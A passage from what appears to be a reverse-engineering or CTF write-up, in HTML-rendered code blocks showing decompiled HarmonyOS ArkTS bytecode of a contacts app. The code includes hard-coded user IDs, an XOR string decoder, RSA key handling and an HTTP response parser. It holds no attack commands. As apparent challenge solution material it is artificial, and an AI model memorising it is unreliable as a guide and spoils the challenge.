<span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (isIn(<span class="string">&quot;finalizeConstruction&quot;</span>, ViewPU.prototype) == <span class="literal">false</span>) &#123;</span><br><span class="line">            Reflect.set(ViewPU.prototype, <span class="string">&quot;finalizeConstruction&quot;</span>, #*#);</span><br><span class="line">        &#125;</span><br><span class="line">        obj = ViewPU.#~@<span class="number">0</span>=#UserList(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/UserList&amp;.#~@0&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/UserList&amp;.#~@0&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/UserList&amp;.#~@0&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/UserList&amp;.#~@0&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="number">4</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        obj2[<span class="string">&quot;username&quot;</span>].getter = obj2.#~@<span class="number">0</span>&gt;#username;</span><br><span class="line">        obj2[<span class="string">&quot;username&quot;</span>].setter = obj2.#~@<span class="number">0</span>&gt;#username^<span class="number">1</span>;</span><br><span class="line">        obj2.UserItem = obj2.#~@<span class="number">0</span>&gt;#UserItem;</span><br><span class="line">        obj2.initialRender = obj2.#~@<span class="number">0</span>&gt;#initialRender;</span><br><span class="line">        obj2.rerender = obj2.#~@<span class="number">0</span>&gt;#rerender;</span><br><span class="line">        _module_0_ = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r17v0, types: [&amp;entry/src/main/ets/components/UserList&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r24v24 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r24v59, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#UserList(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.__username = ObservedPropertySimplePU(<span class="string">&quot;&quot;</span>, obj3, <span class="string">&quot;username&quot;</span>);</span><br><span class="line">        r24 = [Object];</span><br><span class="line">        r24[<span class="number">0</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;f47ac10b-58cc-4372-a567-0e02b2c3d479&quot;</span>]);</span><br><span class="line">        r24[<span class="number">1</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b&quot;</span>]);</span><br><span class="line">        r24[<span class="number">2</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;732390b8-ccb6-41de-a93b-94ea059fd263&quot;</span>]);</span><br><span class="line">        r24[<span class="number">3</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547&quot;</span>]);</span><br><span class="line">        r24[<span class="number">4</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb&quot;</span>]);</span><br><span class="line">        r24[<span class="number">5</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;db62356d-3b99-4764-b378-e46cb95df9e6&quot;</span>]);</span><br><span class="line">        r24[<span class="number">6</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;8f4610ee-ee87-4cca-ad92-6cac4fdbe722&quot;</span>]);</span><br><span class="line">        r24[<span class="number">7</span>] = createobjectwithbuffer([<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;1678d80e-fd4d-4de3-aae2-cb0077f10c21&quot;</span>]);</span><br><span class="line">        obj3.userList = r24;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#UserItem(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">3</span>, <span class="string">&quot;item&quot;</span>, <span class="number">0</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">1</span>, <span class="string">&quot;this&quot;</span>, <span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">        _lexenv_0_1_ = newTarget;</span><br><span class="line">        _lexenv_0_2_ = <span class="built_in">this</span>;</span><br><span class="line">        _lexenv_0_0_ = arg0;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == arg2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        ldlexvar = _lexenv_0_2_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#, Row);</span><br><span class="line">        ldlexvar2 = _lexenv_0_2_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>, Image);</span><br><span class="line">        ldlexvar3 = _lexenv_0_2_;</span><br><span class="line">        ldlexvar3.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>, Column);</span><br><span class="line">        ldlexvar4 = _lexenv_0_2_;</span><br><span class="line">        ldlexvar4.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>, Text);</span><br><span class="line">        Text.pop();</span><br><span class="line">        Column.pop();</span><br><span class="line">        Row.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#rerender(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#username(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__username;</span><br><span class="line">        <span class="keyword">return</span> obj.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">4</span>*#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">5</span>*#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Column.create();</span><br><span class="line">        obj = Column.padding;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;left&quot;</span>, <span class="number">0</span>, <span class="string">&quot;right&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777294</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj3.params = [Object];</span><br><span class="line">        obj2.left = obj3;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777294</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj2.right = obj4;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Column.onClick(#~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">5</span>**#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#username^<span class="number">1</span>(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__username;</span><br><span class="line">        obj.set(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">5</span>**#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        utils = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as utils &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/Utils/utils&amp;&quot;</span>;</span><br><span class="line">        utils.l1Lll1(_lexenv_0_1_.uid);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v24, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#initialRender(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">2</span>*#, Column);</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">2</span>*#^<span class="number">1</span>, List);</span><br><span class="line">        LazyForEach.create(<span class="string">&quot;1&quot;</span>, _lexenv_0_1_, <span class="keyword">import</span> &#123; UserDataSource &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/viewmodel/UserDataSource&amp;&quot;</span>(_lexenv_0_1_.userList), #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#__lazyForEachItemGenFunction, #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#__lazyForEachItemIdFunc);</span><br><span class="line">        LazyForEach.pop();</span><br><span class="line">        List.pop();</span><br><span class="line">        Column.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#updateStateVars(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__username;</span><br><span class="line">        obj.aboutToBeDeleted();</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*#itemCreation2(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        ListItem.create(#~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">4</span>*#, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*#observedDeepRender(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        ldlexvar = _lexenv_1_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(_lexenv_0_0_, ListItem);</span><br><span class="line">        ldlexvar2 = _lexenv_1_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*@<span class="number">5</span>*#, Column);</span><br><span class="line">        obj = _lexenv_1_1_.UserItem;</span><br><span class="line">        obj.bind(_lexenv_1_1_)(_lexenv_0_1_, _lexenv_0_2_);</span><br><span class="line">        Column.pop();</span><br><span class="line">        ListItem.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != arg0.username ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.username = arg0.username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != arg0.userList ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.userList = arg0.userList;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r15v5, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r15v7, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#__lazyForEachItemIdFunc(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">return</span> JSON.stringify(arg0) + arg1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#__lazyForEachItemGenFunction(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">3</span>, <span class="string">&quot;itemCreation2&quot;</span>, <span class="number">0</span>, <span class="string">&quot;item&quot;</span>, <span class="number">1</span>, <span class="string">&quot;index&quot;</span>, <span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">        _lexenv_0_2_ = arg1;</span><br><span class="line">        _lexenv_0_1_ = arg0;</span><br><span class="line">        _lexenv_0_0_ = #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*#itemCreation2;</span><br><span class="line">        #~@<span class="number">0</span>&gt;@<span class="number">2</span>*@<span class="number">3</span>*#observedDeepRender();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__username;</span><br><span class="line">        obj.purgeDependencyOnElmtId(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给出了设置的uid，引出<code>utils</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/common/Utils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/common/Utils/utils&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">utils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r18v13, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r18v19, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r18v4, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        ldobjbyvalue = _lexenv_0_0_[arg1 % _lexenv_0_0_.length];</span><br><span class="line">        <span class="keyword">return</span> String.fromCharCode(arg0.charCodeAt(<span class="number">0</span>) ^ ldobjbyvalue.charCodeAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r20v4, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">2</span>*#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;plainText&quot;</span>, <span class="number">0</span>, <span class="string">&quot;reslove&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_1_ = arg0;</span><br><span class="line">        newobjrange = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as util &#125; from <span class="string">&quot;@ohos:util&quot;</span>.Base64Helper();</span><br><span class="line">        obj = createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.data = newobjrange.decodeSync(_lexenv_1_0_);</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        buffer = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as buffer &#125; from <span class="string">&quot;@ohos:buffer&quot;</span>;</span><br><span class="line">        obj2.data = Uint8Array(buffer.from(_lexenv_1_1_, <span class="string">&quot;utf-8&quot;</span>).buffer);</span><br><span class="line">        _lexenv_0_0_ = obj2;</span><br><span class="line">        cryptoFramework = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">        obj3 = cryptoFramework.createAsyKeyGenerator;</span><br><span class="line">        ldlexvar = _lexenv_2_0_;</span><br><span class="line">        callthisN = obj3(ldlexvar.oo0Oo0(<span class="string">&quot;c`u\u0007\u0002\u0006\t&quot;</span>));</span><br><span class="line">        callthisN.convertKey(obj, <span class="number">0</span>, #~@<span class="number">0</span>&lt;@<span class="number">2</span>**#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">3</span>*#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>.ResponseCode.OK == arg0.responseCode ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ldlexvar = _lexenv_1_0_;</span><br><span class="line">        JSON = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as JSON &#125; from <span class="string">&quot;@ohos:util.json&quot;</span>;</span><br><span class="line">        obj = JSON.parse;</span><br><span class="line">        obj2 = arg0.result;</span><br><span class="line">        callthisN = obj(obj2.toString());</span><br><span class="line">        ldlexvar.uuuuu = ((<span class="number">0</span> != callthisN ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span> || (<span class="number">0</span> != callthisN ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) ? <span class="literal">null</span> : callthisN[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;users&quot;</span>][<span class="number">0</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        console.log(_lexenv_1_0_.uuuuu);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: 